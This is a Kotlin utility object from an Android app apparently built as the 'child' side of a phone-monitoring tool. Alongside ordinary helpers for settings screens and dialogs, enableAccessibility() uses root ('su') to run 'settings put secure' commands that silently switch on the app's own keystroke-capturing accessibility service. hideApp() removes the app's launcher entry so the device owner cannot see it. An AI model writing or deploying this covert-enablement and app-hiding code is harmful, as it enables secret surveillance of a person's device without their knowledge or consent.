package com.github.midros.child.utils

import android.app.Activity
import com.pawegio.kandroid.startActivity
import android.annotation.SuppressLint
import android.content.ComponentName
import android.content.Context
import android.content.DialogInterface
import android.content.pm.PackageManager
import com.github.midros.child.R
import com.github.midros.child.ui.login.LoginActivity
import com.github.midros.child.utils.Consts.TAG
import java.io.DataOutputStream
import java.io.File
import java.text.SimpleDateFormat
import java.util.*
import android.content.Intent
import android.net.Uri
import android.provider.Settings
import com.github.midros.child.BuildConfig
import com.pawegio.kandroid.alert
import com.pawegio.kandroid.d
import com.pawegio.kandroid.start


/**
 * Created by luis rafael on 13/03/18.
 */
object ConstFun{


    fun getPackageCheckSocial(): String = BuildConfig.PACKAGE_CHECK_SOCIAL

    inline fun <reified T : Any> Activity.startAndFinishActivity(){
        startActivity<T>()
        finish()
    }

    fun Context.openAppSystemSettings(){
        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
        val uri = Uri.fromParts("package", packageName, null)
        intent.data = uri
        intent.start(this)
    }

    fun Context.openAccessibilitySettings(){
        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        intent.start(this)
    }

    fun Context.openUseAccessSettings(){
        val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        intent.start(this)
    }

    fun getRandomNumeric() : String = System.currentTimeMillis().toString()


    @SuppressLint("SimpleDateFormat")
    fun getDateTime(): String {
        val dateFormat = SimpleDateFormat("dd MMM yyyy hh:mm a")
        return dateFormat.format(Calendar.getInstance().time)
    }

    fun Context.alertDialog(message:Int,txtPositiveButton:Int,cancelable:Boolean,func : DialogInterface.() -> Unit){
        alert(getString(message),getString(R.string.title_dialog)).apply{
            cancellable(cancelable)
            positiveButton(getString(txtPositiveButton)){func(dialog!!)}
            if (cancelable) negativeButton { dismiss() }
        }.show()
    }

    fun isRootAvailable(): Boolean {
        for (pathDir in System.getenv("PATH").split(":".toRegex()).dropLastWhile { it.isEmpty() }.toTypedArray()) {
            if (File(pathDir, "su").exists()) {
                return true
            }
        }
        return false
    }


    fun enableAccessibility() : Boolean {

        var process : Process?=null
        try {
            process = Runtime.getRuntime().exec("su")
            val os = DataOutputStream(process.outputStream)
            os.writeBytes("settings put secure enabled_accessibility_services com.github.midros.child/com.github.midros.child.services.key.AccessibilityDataService\n")
            os.flush()
            os.writeBytes("settings put secure accessibility_enabled 1\n")
            os.flush()
            os.writeBytes("exit\n")
            os.flush()
            process.waitFor()
            return true
        } catch (e: Exception) {
            d(TAG, "error "+e.message)
            return false
        } finally {
            if (process != null) process.destroy()
        }

    }


    fun Context.showApp(){
        val componentName = ComponentName(this, LoginActivity::class.java)
        packageManager.setComponentEnabledSetting(componentName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP)
    }

    fun Context.hideApp(){
        val componentName = ComponentName(this, LoginActivity::class.java)
        packageManager.setComponentEnabledSetting(componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP)
    }
}